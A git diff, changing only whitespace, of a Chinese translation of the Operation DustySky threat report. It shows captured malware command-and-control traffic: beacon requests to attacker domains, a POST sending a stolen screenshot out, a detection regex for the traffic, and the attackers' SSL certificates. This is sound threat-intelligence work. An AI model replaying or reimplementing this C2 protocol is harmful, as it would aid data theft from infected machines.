@@ -1,7 +1,7 @@
 ---
 title: Operation DustySky文档翻译
 date: 2019-03-01 15:46:33
-tags: 
+tags:
 categories: [Knowledge, Book]
 ---
 
@@ -171,41 +171,41 @@ DustySky有两个硬编码的命令和控制服务器域。 它首先通过向TE
 例如，这是对index.php的初始GET请求：
 
 ```shell
-    GET /index.php HTTP/1.1
-    Host: facetoo.co[.]vu
-    Connection: Keep-Alive
+GET /index.php HTTP/1.1
+Host: facetoo.co[.]vu
+Connection: Keep-Alive
 ```
 
 服务器回复:
 
 ```shell
-    HTTP/1.1 200 OK
-    Date: Sun, 06 Sep 2015 19:52:49 GMT
-    Server: Apache/2.2.15 (CentOS)
-    X-Powered-By: PHP/5.3.3
-    Content-Length: 2
-    Connection: close
-    Content-Type: text/html; charset=UTF-8
+HTTP/1.1 200 OK
+Date: Sun, 06 Sep 2015 19:52:49 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 2
+Connection: close
+Content-Type: text/html; charset=UTF-8
 
-    OK
+OK
 ```
 
 接下来，发送GET请求，其中包含有关受感染计算机的信息，如Base64参数：
 
 ```shell
-    GET
-    /IOS.php?Pn=9TbmRvd3KTxpbmRvd3icj4&fr=&GR=RmFjZUJvb2soSU9TKTxicj4gMjAxNS
-    0wOC0yNA&com=IDxicj4gIDxicj4g&ID=386578203222222738119472812481673914678
-    &o=TWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwg&ho=ZmFjZXRvby5jby52dQ==&
-    av=&v=501P HTTP/1.1
-    User-Agent: 386578203222222738119472812481673914678
-    Host: facetoo.co[.]vu
+GET
+/IOS.php?Pn=9TbmRvd3KTxpbmRvd3icj4&fr=&GR=RmFjZUJvb2soSU9TKTxicj4gMjAxNS
+0wOC0yNA&com=IDxicj4gIDxicj4g&ID=386578203222222738119472812481673914678
+&o=TWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwg&ho=ZmFjZXRvby5jby52dQ==&
+av=&v=501P HTTP/1.1
+User-Agent: 386578203222222738119472812481673914678
+Host: facetoo.co[.]vu
 ```
 
 GET请求中URL的另一个示例：
 
 ```shell
-    http://ra.goaglesmtp.co.vu/NSR.php?Pn=MWw1bEoxVDJqQiB8IFBTUFVCV1M&fr=&GR=REFGQksoTlNSKTxicj4gMjAxNS0xMS0wNA&com=IDxicj4gIDxicj4g&ID=13327920924134561851231757518321517760252DAFBK&o=TWljcm9zb2Z0IFdpbmRvd3MgNyBIb21lIFByZW1pdW0g&ho=cmEuZ29hZ2xlc210cC5jby52dQ==&av=&v=704
+http://ra.goaglesmtp.co.vu/NSR.php?Pn=MWw1bEoxVDJqQiB8IFBTUFVCV1M&fr=&GR=REFGQksoTlNSKTxicj4gMjAxNS0xMS0wNA&com=IDxicj4gIDxicj4g&ID=13327920924134561851231757518321517760252DAFBK&o=TWljcm9zb2Z0IFdpbmRvd3MgNyBIb21lIFByZW1pdW0g&ho=cmEuZ29hZ2xlc210cC5jby52dQ==&av=&v=704
 ```
 
 <img src = "Operation DustySky_20.png" width = 80%>
@@ -213,23 +213,23 @@ GET请求中URL的另一个示例：
 以下正则表达式与通信模式匹配：
 
 ```js
-    \/[A-Za-z]{2,5}\.php\?(?:(Pn|fr|GR|com|ID|o|ho|av|v)=[A-Za-z0-9\/=+]*={0,2}&?){5,9}
+\/[A-Za-z]{2,5}\.php\?(?:(Pn|fr|GR|com|ID|o|ho|av|v)=[A-Za-z0-9\/=+]*={0,2}&?){5,9}
 ```
 
 作为POST请求发送到命令和控制的被盗信息：
 
 ```shell
-    POST /RaR.php HTTP/1.1
-    Content-Type: application/x-www-form-urlencoded
-    User-Agent: 1042541562231131292551331782259622162135190107BK
-    Host: down.supportcom.xyz
-    Content-Length: 109127
-    Expect: 100-continue
+POST /RaR.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: 1042541562231131292551331782259622162135190107BK
+Host: down.supportcom.xyz
+Content-Length: 109127
+Expect: 100-continue
 
-    ke=iVBORw0KGgoAAAANSUhEUgAAAyAAAAJYCAYAAACadoJwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEh....
-    ID=1042541562231131292551331782259622162135190107BK&
-    N=Screen-2015-10-06_05-15-34-PM.png
-    HTTP/1.1 100 Continue
+ke=iVBORw0KGgoAAAANSUhEUgAAAyAAAAJYCAYAAACadoJwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEh....
+ID=1042541562231131292551331782259622162135190107BK&
+N=Screen-2015-10-06_05-15-34-PM.png
+HTTP/1.1 100 Continue
 ```
 
 ## SSL和数字证书
@@ -239,17 +239,17 @@ GET请求中URL的另一个示例：
 域名'bulk-smtp [.] xyz'由攻击者拥有，使用以下数字证书：
 
 ```shell
-    Certificate:
-        Data:
-            Version: 3 (0x2)
-            Serial Number:
-                35:e5:39:4c:58:e8:4d:f5:fa:9a:3c:25:21:12:01:19
-        Signature Algorithm: sha256WithRSAEncryption
-            Issuer: C=GB, ST=Greater Manchester, L=Salford, O=COMODO CA Limited,CN=COMODO RSA Domain Validation Secure Server CA
-            Validity
-                Not Before: Nov 25 00:00:00 2015 GMT
-                Not After : Nov 24 23:59:59 2016 GMT
-            Subject: OU=Domain Control Validated, OU=PositiveSSL, CN=bulk-smtp.xyz
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            35:e5:39:4c:58:e8:4d:f5:fa:9a:3c:25:21:12:01:19
+    Signature Algorithm: sha256WithRSAEncryption
+        Issuer: C=GB, ST=Greater Manchester, L=Salford, O=COMODO CA Limited,CN=COMODO RSA Domain Validation Secure Server CA
+        Validity
+            Not Before: Nov 25 00:00:00 2015 GMT
+            Not After : Nov 24 23:59:59 2016 GMT
+        Subject: OU=Domain Control Validated, OU=PositiveSSL, CN=bulk-smtp.xyz
 ```
 
 <img src = "Operation DustySky_21.png" width = 60%>
@@ -258,31 +258,31 @@ GET请求中URL的另一个示例：
 在使用Comodo颁发的证书之前，攻击者使用了自签名证书，冒充一家名为EMS的以色列TelAviv公司。 证书中的组织统一性是“电子邮件营销销售”
 
 ```shell
-    Certificate:
-        Data:
-            Version: 3 (0x2)
-            Serial Number: 13229300438499639338 (0xb797eaa82fb0c02a)
-        Signature Algorithm: sha256WithRSAEncryption
-            Issuer: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml
-            Validity
-                Not Before: Nov 17 14:15:08 2015 GMT
-                Not After : Nov 16 14:15:08 2016 GMT
-            Subject: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: 13229300438499639338 (0xb797eaa82fb0c02a)
+    Signature Algorithm: sha256WithRSAEncryption
+        Issuer: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml
+        Validity
+            Not Before: Nov 17 14:15:08 2015 GMT
+            Not After : Nov 16 14:15:08 2016 GMT
+        Subject: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml
 ```
 
 对于另一个域smtp.gq，使用了这个自签名证书：
 
 ```shell
-    Certificate:
-        Data:
-            Version: 1 (0x0)
-            Serial Number: 12074485766838107425 (0xa79130d4e1e53d21)
-        Signature Algorithm: sha1WithRSAEncryption
-            Issuer: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co., CN=smtp.gq/emailAddress=info@smtp.gq
-            Validity
-                Not Before: Nov 17 14:48:51 2015 GMT
-                Not After : Dec 17 14:48:51 2015 GMT
-            Subject: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co.,CN=smtp.gq /emailAddress=info@smtp.gq
+Certificate:
+    Data:
+        Version: 1 (0x0)
+        Serial Number: 12074485766838107425 (0xa79130d4e1e53d21)
+    Signature Algorithm: sha1WithRSAEncryption
+        Issuer: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co., CN=smtp.gq/emailAddress=info@smtp.gq
+        Validity
+            Not Before: Nov 17 14:48:51 2015 GMT
+            Not After : Dec 17 14:48:51 2015 GMT
+        Subject: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co.,CN=smtp.gq /emailAddress=info@smtp.gq
 ```
 
 与其命令和控制服务器通信时，DustySky通信使用以下部分或全部路径：
